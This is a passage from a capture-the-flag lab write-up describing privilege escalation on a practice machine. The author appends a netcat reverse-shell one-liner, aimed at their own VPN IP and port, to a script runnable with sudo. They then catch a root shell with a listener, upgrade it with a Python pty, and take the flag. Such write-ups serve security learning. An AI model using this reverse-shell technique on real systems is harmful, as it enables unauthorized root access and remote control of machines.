Escalating privileges

inside the nibbler user home directory was a zip file called persona.zip So un unzipped and get a personal directory

From there i browse inside until an .sh file was found with sudo -l i saw i was able to execute this file with root privileges so i append a one liner reverse shell that was targeting my IP and the port 8443 (the address was the tun0 ip)

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 8443 >/tmp/f' | tee -a monitor.sh

Before executing the monitor.sh file i started a netcat listening in port 8443

nc -lvnp 8443

then executed the file and got the root reverse shell

to get a better shell executed this python3 lib:

python3 -c 'import pty; pty.spawn("/bin/bash")'

and went straight to the root home folder and grabbed the root flag! This took me like 4 HS , had lot of issues to get everything working keep the hard work my friend!
